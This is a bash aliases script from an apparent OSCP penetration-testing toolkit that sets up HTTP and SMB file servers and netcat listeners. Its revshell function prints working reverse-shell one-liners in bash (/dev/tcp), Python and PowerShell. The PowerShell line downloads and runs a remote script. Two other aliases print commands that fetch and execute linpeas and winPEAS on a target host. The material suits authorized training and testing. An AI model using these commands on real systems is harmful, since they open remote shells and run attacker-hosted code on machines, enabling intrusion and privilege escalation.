#!/usr/bin/env bash
# aliases.sh - Source this to enable arsenal shortcuts:  source aliases.sh
# Add to .bashrc/.zshrc:  source ~/oscp-arsenal/aliases.sh

ARSENAL_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
export ARSENAL_ROOT

tun0ip() {
    ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1
}
alias myip='tun0ip'

# HTTP server in arsenal root
alias arsenal-serve="cd \"$ARSENAL_ROOT/tools\" && python3 -m http.server 80"
alias arsenal-serve8000="cd \"$ARSENAL_ROOT/tools\" && python3 -m http.server 8000"

# Helpers
alias payloads="$ARSENAL_ROOT/payloads.sh"
alias arsenal-update="$ARSENAL_ROOT/update.sh"

# Listeners
alias nc4444='rlwrap nc -lvnp 4444 2>/dev/null || nc -lvnp 4444'
alias nc443='rlwrap nc -lvnp 443 2>/dev/null || nc -lvnp 443'

# SMB share (impacket)
alias smb-share="impacket-smbserver share \"$ARSENAL_ROOT/tools\" -smb2support"
alias smb-share-anon="impacket-smbserver share \"$ARSENAL_ROOT/tools\" -smb2support -username '' -password ''"

# Quick reverse shell oneliners
revshell() {
    local ip="${1:-$(tun0ip)}"
    local port="${2:-4444}"
    echo "# bash:"
    echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
    echo "# python3:"
    echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo "# powershell (via http server):"
    echo "iex (iwr http://$ip:8000/revshells/Invoke-PowerShellTcp.ps1 -UseBasicParsing).Content; Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port $port"
}

alias lpeas="echo 'On target: wget http://'\$(tun0ip)':8000/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh'"
alias wpeas="echo 'On target: iwr http://'\$(tun0ip)':8000/windows/winPEASx64.exe -o \$env:TEMP\\\\wp.exe; & \$env:TEMP\\\\wp.exe'"

echo "[+] OSCP arsenal aliases loaded. Commands: arsenal-serve, payloads, revshell <ip> <port>, myip, nc4444, smb-share, lpeas, wpeas"
